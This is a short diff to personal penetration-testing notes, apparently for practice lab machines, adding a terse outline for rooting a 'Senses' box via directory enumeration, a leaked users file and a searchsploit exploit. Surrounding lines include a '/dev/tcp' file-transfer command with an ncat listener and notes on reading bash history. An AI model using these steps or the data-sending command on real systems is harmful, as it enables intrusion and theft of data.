@@ -12,6 +12,11 @@ trasnfer file:
 cat backup.7z > /dev/tcp/ip/9001
 ncat -lvnp 9001 > backup.7z
 
+#vv Senses Machine:
+  check dirb and gobuses using extension -> open system-users.txt
+  login and check the version, search on searchploit then run!
+  got the root!
+
 # Valentine Machine:
   check the ssl vulnerability, got the ssh-hey
   check the bash history: $ cat ~/.bash_history
